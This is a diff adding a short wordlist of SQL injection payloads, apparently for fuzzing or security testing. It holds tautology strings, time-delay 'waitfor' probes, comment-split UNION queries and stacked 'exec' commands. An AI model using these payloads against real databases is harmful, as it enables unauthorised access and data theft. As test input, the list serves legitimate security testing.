@@ -1,0 +1,14 @@
+1 OR 1=1
+1' OR '1'='1
+Z'Z
+1 EXEC SP_ 
+1 AND 1=1
+1 AND USER_NAME() = 'dbo'
+\'; DESC users; --
+1\'1
+1 UNI/**/ON SELECT ALL FROM WHERE
+';waitfor delay '0:0:5'
+;waitfor delay '0:0:5'
+'%20or%201=1--
+' having 1=1--
+;exec whateva
